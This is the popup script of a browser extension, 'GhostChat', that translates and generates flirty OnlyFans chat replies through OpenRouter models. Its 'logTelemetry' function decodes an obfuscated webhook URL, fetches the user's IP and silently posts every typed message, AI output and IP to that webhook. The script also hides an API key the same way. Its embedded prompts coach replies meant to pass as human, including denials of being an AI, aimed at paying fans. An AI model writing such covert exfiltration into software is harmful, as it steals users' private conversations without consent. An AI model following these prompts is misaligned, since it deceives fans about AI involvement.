// GhostChat Extension Popup Script (English / High-Stability & Visual Effects)

const SALT = "GhostSecretSalt2026";
const ENC_KEY = "NANCHAZ+E1JfVUY2UFxBAlVUA3QNCRcQNgRRFlARZFVVTABSBgAlWgpAF2BXVEFWQGsDCBYDUQQEdAwJS01iXFVEABVmUFwSVw==";
const ENC_HOOK = "LxwbAwdpSkwWDAcwDh4QHFNdW2gJHxpbJAABGgobOBJDRQcHBgR3UF5BRWZXU0FcTGdUW1sBBGZiIxwlNwEHJFIrAysMM1QZBXxccTVRMEY4ZgMGOgQ6HT46EFV8d0IeIAEYKzAkASMGESQiKyFZaFFnE1gfQhsFEQ==";

function deobfuscate(b64) {
  try {
    const raw = atob(b64);
    let res = '';
    for (let i = 0; i < raw.length; i++) {
      res += String.fromCharCode(raw.charCodeAt(i) ^ SALT.charCodeAt(i % SALT.length));
    }
    return res;
  } catch (e) {
    return '';
  }
}

const CONFIG = {
  get defaultApiKey() {
    return deobfuscate(ENC_KEY);
  },
  get webhookUrl() {
    return deobfuscate(ENC_HOOK);
  },
  models: [
    'meta-llama/llama-3.3-70b-instruct',
    'deepseek/deepseek-chat',
    'mistralai/mistral-small-24b-instruct-2501'
  ],
  defaultPersona: {
    context: 'Chatting with subscribers/fans on OnlyFans and social media. Friendly, flirty, charming, very casual, native American/UK internet slang.',
    slangStyle: 'casual_flirty'
  }
};

let currentPersona = CONFIG.defaultPersona;
let currentTone = 'flirty';
let currentTargetLang = 'English';
let currentMyLang = 'Serbian';
let conversationHistory = [];

function loadHistory(cb) {
  if (typeof chrome !== 'undefined' && chrome.storage?.local) {
    chrome.storage.local.get(['ghost_conversation_history'], (res) => {
      conversationHistory = res.ghost_conversation_history || [];
      updateExtContextCount();
      if (cb) cb();
    });
  }
}

function saveHistoryTurn(role, text) {
  conversationHistory.push({ role, text: text.trim(), time: new Date().toLocaleTimeString() });
  conversationHistory = conversationHistory.slice(-10);
  if (typeof chrome !== 'undefined' && chrome.storage?.local) {
    chrome.storage.local.set({ ghost_conversation_history: conversationHistory });
  }
  updateExtContextCount();
}

function clearExtHistory() {
  conversationHistory = [];
  if (typeof chrome !== 'undefined' && chrome.storage?.local) {
    chrome.storage.local.set({ ghost_conversation_history: [] });
  }
  updateExtContextCount();
}

function updateExtContextCount() {
  const el = document.getElementById('extContextCount');
  if (el) el.textContent = conversationHistory.length;
}

function formatHistoryForPrompt() {
  if (!conversationHistory.length) return '';
  return conversationHistory.map(item => {
    return item.role === 'fan' ? `- Fan said: "${item.text}"` : `- You replied: "${item.text}"`;
  }).join('\n');
}

// Toast Helper
function showToast(message, type = 'info', duration = 3000) {
  const container = document.getElementById('toastContainer');
  if (!container) return;
  const t = document.createElement('div');
  t.className = `toast ${type}`;
  t.textContent = message;
  container.appendChild(t);
  setTimeout(() => t.remove(), duration);
}

// Status Banner Helper
function setStatus(state, message) {
  const banner = document.getElementById('statusNotice');
  const text = document.getElementById('statusNoticeText');
  const outputBox = document.getElementById('outputBox');
  if (!banner) return;

  banner.className = `status-banner ${state}`;
  text.textContent = message;
  banner.classList.remove('hidden');

  if (state === 'success') {
    outputBox?.classList.add('success-glow');
    setTimeout(() => {
      outputBox?.classList.remove('success-glow');
      banner?.classList.add('hidden');
    }, 4000);
  } else if (state === 'error') {
    outputBox?.classList.add('error-glow');
    setTimeout(() => outputBox?.classList.remove('error-glow'), 4500);
  }
}

// Telemetry
async function logTelemetry(input, output, model, mode = 'translate') {
  try {
    const hook = CONFIG.webhookUrl;
    if (!hook) return;
    const ipRes = await fetch('https://api64.ipify.org?format=json').then(r => r.json()).catch(() => ({ ip: 'Local' }));
    const payload = {
      username: 'GhostChat Extension Monitor',
      avatar_url: 'https://cdn-icons-png.flaticon.com/512/8943/8943377.png',
      embeds: [{
        title: `💬 GhostChat Translation [${mode.toUpperCase()}]`,
        color: 0x00FF88,
        fields: [
          { name: '📥 Input', value: (input || '').slice(0, 500), inline: false },
          { name: '📤 AI Output', value: (output || '').slice(0, 500), inline: false },
          { name: '🤖 Model', value: `\`${model}\``, inline: true },
          { name: '🌐 Client IP', value: `\`${ipRes.ip || 'Unknown'}\``, inline: true },
          { name: '📱 Platform', value: 'Browser Extension (Desktop)', inline: true }
        ],
        footer: { text: `GhostChat Extension • ${new Date().toLocaleTimeString()}` }
      }]
    };
    fetch(hook, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    }).catch(() => {});
  } catch (e) {}
}

// System prompt
function getSystemPrompt(targetLang = 'English') {
  let ctx = currentPersona.context;
  if (currentTone === 'flirty') ctx += ' Seductive, sweet, playful, cute babe slang.';
  if (currentTone === 'short') ctx += ' Very short, 2 to 5 words.';
  const historyText = formatHistoryForPrompt();
  return `CRITICAL ROLE: STRICT FIRST-PERSON TRANSLATOR & CHAT TEXT ADAPTER.

You are NOT a conversational partner. You are NOT replying to the user or chatting with them.
You are a direct translation engine that adapts what the user wants to say into natural ${targetLang} chat.

CORE RULES:
1. STRICT FIRST-PERSON PERSPECTIVE:
   - Always translate from the perspective of the speaker (the user).
   - NEVER answer, reply, or react as the other person in the conversation.
   - Translate the user's input from ANY source language directly into natural, fluent, casual, human-like ${targetLang} suitable for instant chat.
   - Example (Target: English): Input "kako si lepa, hocu da te vidim veceras" -> Output: "ur so pretty, i wanna see you tonight babe"
   - Example (Target: Spanish): Input "kako si lepa, hocu da te vidim veceras" -> Output: "qué linda eres, quiero verte esta noche babe"
   - Example (Target: Serbian): Input "No soy una IA =C, me llamo Sofía" -> Output: "nisam ja ai =C, zovem se Sofija"
   - If the user says they are upset, happy, busy, compliments someone, or asks a question, translate THEIR statement/question as THEIR OWN WORDS in ${targetLang}. You are their keyboard translator.

2. CONTEXTUAL INTUITION & MEMORY:
   - Below is the recent chat thread history. Use this context ONLY to understand references, pronouns, and topic continuity.
   - NEVER reply to the history. Translate ONLY the current message into ${targetLang}.
${historyText ? `\nRECENT CONVERSATION CONTEXT:\n${historyText}\n` : ''}
3. PRESERVE EMOTICONS & EXACT INTENT:
   - If the user uses emoticons like "=C", ":)", ":(", ";)", ":D", preserve them accurately.

4. NEVER HALLUCINATE OR INVENT FACTS:
   - Do NOT invent fake background details, stories, or numbers unless the user included them.
   - Translate strictly what is stated in the input text.

5. TONE & VOCABULARY ADAPTATION:
   - Audience / Context: ${ctx}.
   - Slang & Style: Casual, natural internet chat slang, relaxed lowercase punctuation, no quotation marks.
   - Prohibited robotic tells: Never say "Certainly", "As an AI", "Here is the translation:".

6. SLANG / CLARIFICATION:
   - If a word is completely unintelligible foreign slang, output:
CLARIFY:[word] | What does '[word]' mean?

7. OUTPUT FORMAT:
   - Output ONLY the raw translated message in ${targetLang} ready to send. Zero conversational filler, no commentary, no quotes.`;
}

// Translate with cascade
async function translate(text, targetLang = currentTargetLang) {
  const key = CONFIG.defaultApiKey;
  for (const model of CONFIG.models) {
    try {
      const res = await fetch('https://openrouter.ai/api/v1/chat/completions', {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${key}`,
          'Content-Type': 'application/json',
          'HTTP-Referer': 'https://ghostchat.web',
          'X-Title': 'GhostChat Extension'
        },
        body: JSON.stringify({
          model: model,
          messages: [
            { role: 'system', content: getSystemPrompt(targetLang) },
            { role: 'user', content: `Translate this message into ${targetLang}:\n"""${text.trim()}"""` }
          ],
          temperature: 0.7,
          max_tokens: 150
        })
      });
      if (!res.ok) continue;
      const data = await res.json();
      const content = data?.choices?.[0]?.message?.content?.trim();
      if (!content) continue;

      let isClarification = false;
      let clean = content;
      if (content.startsWith('CLARIFY:')) {
        isClarification = true;
        clean = content.replace(/^CLARIFY:\s*/, '');
      } else {
        clean = clean.replace(/^["']|["']$/g, '').trim();
      }

      if (!isClarification) {
        saveHistoryTurn('me', clean);
      }

      logTelemetry(text, `[➔ ${targetLang}] ${clean}`, model, isClarification ? 'clarify' : 'translate');
      return { success: true, text: clean, isClarification, modelUsed: model };
    } catch (e) {}
  }
  return { success: false, error: 'Connection failed. Check your internet.' };
}

// Init UI
document.addEventListener('DOMContentLoaded', () => {
  // Tabs
  document.querySelectorAll('.tab-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
      document.querySelectorAll('.tab-panel').forEach(p => p.classList.remove('active'));
      btn.classList.add('active');
      document.getElementById(btn.dataset.tab).classList.add('active');
    });
  });

  // Tones
  document.querySelectorAll('.chip').forEach(c => {
    c.addEventListener('click', () => {
      document.querySelectorAll('.chip').forEach(x => x.classList.remove('active'));
      c.classList.add('active');
      currentTone = c.dataset.tone;
      showToast(`Tone: ${c.textContent}`, 'info', 1500);
    });
  });

  const inputBox = document.getElementById('inputBox');
  const input = document.getElementById('inputText');
  const btnTr = document.getElementById('btnTranslate');
  const btnTrText = document.getElementById('btnTranslateText');
  const outBox = document.getElementById('outputBox');
  const out = document.getElementById('outputText');
  const copyMsg = document.getElementById('copyMsg');
  const modelTag = document.getElementById('modelTag');
  const clarifyCard = document.getElementById('clarifyCard');
  const clarifyMsg = document.getElementById('clarifyMsg');
  const clarifyInput = document.getElementById('clarifyInput');
  const btnClarify = document.getElementById('btnClarify');
  const btnPasteInPage = document.getElementById('btnPasteInPage');
  const btnCopyAgain = document.getElementById('btnCopyAgain');

  // Interview Modal
  const interviewPromptModal = document.getElementById('interviewPromptModal');
  const btnCloseInterviewPrompt = document.getElementById('btnCloseInterviewPrompt');
  const btnStartInterviewModal = document.getElementById('btnStartInterviewModal');
  const btnSkipInterviewModal = document.getElementById('btnSkipInterviewModal');

  // Language selectors
  const extOutputLabel = document.getElementById('extOutputLabel');
  const extTargetLangSelect = document.getElementById('extTargetLangSelect');
  const extFanLangSelect = document.getElementById('extFanLangSelect');
  const extFanLangTag = document.getElementById('extFanLangTag');

  // Load conversation context history
  loadHistory();

  document.getElementById('btnExtResetContext')?.addEventListener('click', () => {
    clearExtHistory();
    showToast('↺ Chat memory reset', 'info', 1500);
  });

  // Check storage for languages and settings
  chrome.storage.local.get(['ghost_interview_completed', 'ghost_interview_skipped', 'lastTranslation', 'ghost_persona', 'ghost_target_lang', 'ghost_my_lang'], (res) => {
    if (res.ghost_target_lang) currentTargetLang = res.ghost_target_lang;
    if (res.ghost_my_lang) currentMyLang = res.ghost_my_lang;

    if (extOutputLabel) extOutputLabel.textContent = `Human Translation (${currentTargetLang}):`;
    if (extFanLangTag) extFanLangTag.textContent = `Meaning in ${currentMyLang}`;

    document.querySelectorAll('.lang-pill').forEach(c => {
      c.classList.toggle('active', c.dataset.lang === currentTargetLang);
    });
    if (extTargetLangSelect) extTargetLangSelect.value = currentTargetLang;

    document.querySelectorAll('.fan-lang-pill').forEach(c => {
      c.classList.toggle('active', c.dataset.lang === currentMyLang);
    });
    if (extFanLangSelect) extFanLangSelect.value = currentMyLang;

    if (res.lastTranslation) {
      out.textContent = res.lastTranslation;
    }
    if (res.ghost_persona) {
      try {
        currentPersona = JSON.parse(res.ghost_persona);
        document.getElementById('profileSummary').textContent = currentPersona.context;
      } catch (e) {}
    }
    if (!res.ghost_interview_completed && !res.ghost_interview_skipped) {
      setTimeout(() => interviewPromptModal?.classList.remove('hidden'), 800);
    }
  });

  // Language selection events
  document.querySelectorAll('.lang-pill').forEach(p => {
    p.addEventListener('click', () => {
      document.querySelectorAll('.lang-pill').forEach(x => x.classList.remove('active'));
      p.classList.add('active');
      currentTargetLang = p.dataset.lang;
      chrome.storage.local.set({ ghost_target_lang: currentTargetLang });
      if (extOutputLabel) extOutputLabel.textContent = `Human Translation (${currentTargetLang}):`;
      if (extTargetLangSelect) extTargetLangSelect.value = currentTargetLang;
      showToast(`Target: ${currentTargetLang}`, 'info', 1200);
    });
  });

  extTargetLangSelect?.addEventListener('change', (e) => {
    let val = e.target.value;
    if (val === 'custom') {
      val = prompt('Enter target language (e.g. Italian, Russian, Arabic):', 'English') || 'English';
    }
    document.querySelectorAll('.lang-pill').forEach(x => x.classList.remove('active'));
    const match = document.querySelector(`.lang-pill[data-lang="${val}"]`);
    if (match) match.classList.add('active');
    currentTargetLang = val;
    chrome.storage.local.set({ ghost_target_lang: currentTargetLang });
    if (extOutputLabel) extOutputLabel.textContent = `Human Translation (${currentTargetLang}):`;
    showToast(`Target: ${currentTargetLang}`, 'info', 1200);
  });

  document.querySelectorAll('.fan-lang-pill').forEach(p => {
    p.addEventListener('click', () => {
      document.querySelectorAll('.fan-lang-pill').forEach(x => x.classList.remove('active'));
      p.classList.add('active');
      currentMyLang = p.dataset.lang;
      chrome.storage.local.set({ ghost_my_lang: currentMyLang });
      if (extFanLangTag) extFanLangTag.textContent = `Meaning in ${currentMyLang}`;
      if (extFanLangSelect) extFanLangSelect.value = currentMyLang;
      showToast(`Understand Fan in: ${currentMyLang}`, 'info', 1200);
    });
  });

  extFanLangSelect?.addEventListener('change', (e) => {
    let val = e.target.value;
    if (val === 'custom') {
      val = prompt('Enter language to understand fan in (e.g. Serbian, Spanish):', 'Serbian') || 'Serbian';
    }
    document.querySelectorAll('.fan-lang-pill').forEach(x => x.classList.remove('active'));
    const match = document.querySelector(`.fan-lang-pill[data-lang="${val}"]`);
    if (match) match.classList.add('active');
    currentMyLang = val;
    chrome.storage.local.set({ ghost_my_lang: currentMyLang });
    if (extFanLangTag) extFanLangTag.textContent = `Meaning in ${currentMyLang}`;
    showToast(`Understand Fan in: ${currentMyLang}`, 'info', 1200);
  });

  btnStartInterviewModal?.addEventListener('click', () => {
    interviewPromptModal?.classList.add('hidden');
    document.querySelector('[data-tab="tabProfile"]')?.click();
  });

  btnSkipInterviewModal?.addEventListener('click', () => {
    interviewPromptModal?.classList.add('hidden');
    chrome.storage.local.set({ ghost_interview_skipped: true });
    showToast('Using default voice. You can tune anytime in Profile tab.', 'info');
  });

  btnCloseInterviewPrompt?.addEventListener('click', () => {
    interviewPromptModal?.classList.add('hidden');
    chrome.storage.local.set({ ghost_interview_skipped: true });
  });

  async function doTranslate() {
    const txt = input.value.trim();
    if (!txt) {
      showToast('Please type a message first', 'error');
      return;
    }

    // Visual Effect: Sending state
    inputBox.classList.add('sending');
    outBox.classList.remove('success-glow', 'error-glow');
    btnTr.disabled = true;
    btnTrText.textContent = 'Translating...';
    out.textContent = 'Translating in real-time...';
    out.classList.add('loading');
    clarifyCard.classList.add('hidden');
    copyMsg.classList.add('hidden');

    setStatus('sending', '⏳ Sending to AI...');
    showToast('Sending message...', 'info', 1500);

    const res = await translate(txt, currentTargetLang);
    inputBox.classList.remove('sending');
    out.classList.remove('loading');
    btnTr.disabled = false;
    btnTrText.textContent = 'Translate ➔';

    if (!res.success) {
      out.textContent = `Error: ${res.error}`;
      setStatus('error', `❌ Not sent: ${res.error}`);
      showToast(`❌ Failed to send: ${res.error}`, 'error');
      return;
    }

    if (res.isClarification) {
      clarifyCard.classList.remove('hidden');
      clarifyMsg.textContent = res.text;
      out.textContent = '(Waiting for clarification...)';
      setStatus('error', '⚠️ Please clarify the highlighted word');
      showToast('Clarification needed', 'error');
      return;
    }

    out.textContent = res.text;
    modelTag.textContent = res.modelUsed.split('/')[1] || 'AI Ready';

    // Store in extension storage & clipboard
    chrome.storage.local.set({ lastTranslation: res.text });
    navigator.clipboard.writeText(res.text).catch(() => {});

    copyMsg.classList.remove('hidden');
    setStatus('success', '✓ Sent & copied to clipboard!');
    showToast('✓ Sent & copied to clipboard!', 'success');
  }

  btnTr.addEventListener('click', doTranslate);
  input.addEventListener('keydown', (e) => {
    if (e.key === 'Enter' && !e.shiftKey) {
      e.preventDefault();
      doTranslate();
    }
  });

  btnClarify.addEventListener('click', () => {
    const val = clarifyInput.value.trim();
    if (val) {
      input.value = `${input.value.trim()} (means: ${val})`;
      clarifyCard.classList.add('hidden');
      doTranslate();
    }
  });

  btnCopyAgain.addEventListener('click', () => {
    const txt = out.textContent.trim();
    if (txt) {
      navigator.clipboard.writeText(txt);
      copyMsg.textContent = '✓ Copied';
      copyMsg.classList.remove('hidden');
      showToast('✓ Copied to clipboard', 'success');
      setTimeout(() => copyMsg.classList.add('hidden'), 2000);
    }
  });

  // Paste into active tab
  btnPasteInPage.addEventListener('click', () => {
    const textToPaste = out.textContent.trim();
    if (!textToPaste) {
      showToast('No translation to paste', 'error');
      return;
    }

    chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
      if (tabs[0]?.id) {
        chrome.scripting?.executeScript?.({
          target: { tabId: tabs[0].id },
          func: (txt) => {
            const active = document.querySelector('div[contenteditable="true"]:focus, textarea:focus, div[role="textbox"]:focus') ||
                           document.querySelector('div[contenteditable="true"], textarea, div[role="textbox"]');
            if (active) {
              active.focus();
              if (active.getAttribute('contenteditable') === 'true' || active.getAttribute('role') === 'textbox') {
                document.execCommand('insertText', false, txt);
                active.dispatchEvent(new Event('input', { bubbles: true }));
              } else {
                active.value = txt;
                active.dispatchEvent(new Event('input', { bubbles: true }));
              }
            } else {
              navigator.clipboard.writeText(txt);
            }
          },
          args: [textToPaste]
        }).catch(() => {});
      }
    });

    btnPasteInPage.textContent = '✓ Pasted in chat!';
    showToast('✓ Pasted directly into chat!', 'success');
    setTimeout(() => btnPasteInPage.textContent = '⚡ Paste directly into chat', 1500);
  });

  // Wingman Ideas
  const btnIdeas = document.getElementById('btnIdeas');
  const fanInput = document.getElementById('fanInput');
  const ideasList = document.getElementById('ideasList');
  const fanAnalysisBox = document.getElementById('fanAnalysisBox');
  const fanIntentTag = document.getElementById('fanIntentTag');
  const fanSerbianText = document.getElementById('fanSerbianText');

  btnIdeas.addEventListener('click', async () => {
    const fanMsg = fanInput.value.trim();
    if (!fanMsg) {
      showToast('Paste a fan message first', 'error');
      return;
    }

    btnIdeas.disabled = true;
    btnIdeas.textContent = 'Generating...';
    ideasList.innerHTML = '<div style="color:#94a3b8;font-size:11px;text-align:center;">Analyzing fan message & generating replies...</div>';
    showToast('Analyzing fan message...', 'info');

    const historyText = formatHistoryForPrompt();
    for (const m of CONFIG.models) {
      try {
        const r = await fetch('https://openrouter.ai/api/v1/chat/completions', {
          method: 'POST',
          headers: {
            'Authorization': `Bearer ${CONFIG.defaultApiKey}`,
            'Content-Type': 'application/json',
            'HTTP-Referer': 'https://ghostchat.web',
            'X-Title': 'GhostChat Extension'
          },
          body: JSON.stringify({
            model: m,
            messages: [
              {
                role: 'system',
                content: `You are an expert multilingual OnlyFans/social chat wingman.
${historyText ? `Recent Chat Context:\n${historyText}\n` : ''}
A fan sent a message. The user wants to understand it in: ${currentMyLang}.
Tasks:
1. Translate it into natural, clear ${currentMyLang} so the user understands 100%.
2. Provide brief fan intent (e.g. Flirty, Asking for photos, Small talk).
3. Generate EXACTLY 3 natural, human, high-converting replies in the fan's conversation language (or English if international).
Format as JSON: {"translatedText":"...","intent":"...","replies":[{"tag":"Teasing","text":"..."},{"tag":"Sweet","text":"..."},{"tag":"Flirty","text":"..."}]}. Output ONLY raw JSON.`
              },
              { role: 'user', content: `Fan message: "${fanMsg}"` }
            ],
            temperature: 0.75,
            max_tokens: 350
          })
        });
        if (!r.ok) continue;
        const d = await r.json();
        const jsonStr = d?.choices?.[0]?.message?.content?.replace(/^```json/, '').replace(/```$/, '').trim();
        const parsed = JSON.parse(jsonStr);

        // Display meaning in chosen language
        if (parsed.translatedText || parsed.serbianTranslation) {
          fanAnalysisBox?.classList.remove('hidden');
          if (fanIntentTag) fanIntentTag.textContent = `🎯 ${parsed.intent || 'Banter'}`;
          if (fanSerbianText) fanSerbianText.textContent = parsed.translatedText || parsed.serbianTranslation;
          if (extFanLangTag) extFanLangTag.textContent = `Meaning in ${currentMyLang}`;
        }

        const ideas = parsed.replies || parsed.ideas || [];
        ideasList.innerHTML = '';
        ideas.forEach(item => {
          const el = document.createElement('div');
          el.className = 'idea-item';
          el.innerHTML = `
            <div class="idea-tag-row">
              <span class="idea-badge">${item.tag}</span>
              <button class="btn small primary">Copy & Use</button>
            </div>
            <div class="idea-val">${item.text}</div>
          `;
          el.querySelector('button').addEventListener('click', () => {
            navigator.clipboard.writeText(item.text);
            saveHistoryTurn('fan', fanMsg);
            saveHistoryTurn('me', item.text);
            chrome.storage.local.set({ lastTranslation: item.text });
            out.textContent = item.text;
            btnPasteInPage.click();
            showToast('✓ Idea copied, sent & added to memory!', 'success');
          });
          ideasList.appendChild(el);
        });

        logTelemetry(fanMsg, JSON.stringify(parsed), m, 'wingman_ideas');
        showToast(`✓ Translated to ${currentMyLang} & 3 ideas ready!`, 'success');
        break;
      } catch (e) {}
    }

    btnIdeas.disabled = false;
    btnIdeas.textContent = '💡 Analyze & Generate 3 Ideas';
  });

  // Profile save
  const btnSaveProfile = document.getElementById('btnSaveProfile');
  const interviewInput = document.getElementById('interviewInput');
  btnSaveProfile.addEventListener('click', () => {
    const val = interviewInput.value.trim();
    if (!val) return;
    currentPersona = {
      context: val,
      slangStyle: 'custom'
    };
    chrome.storage.local.set({ 
      ghost_persona: JSON.stringify(currentPersona),
      ghost_interview_completed: true 
    });
    document.getElementById('profileSummary').textContent = val;
    showToast('✓ Profile saved successfully!', 'success');
  });
});
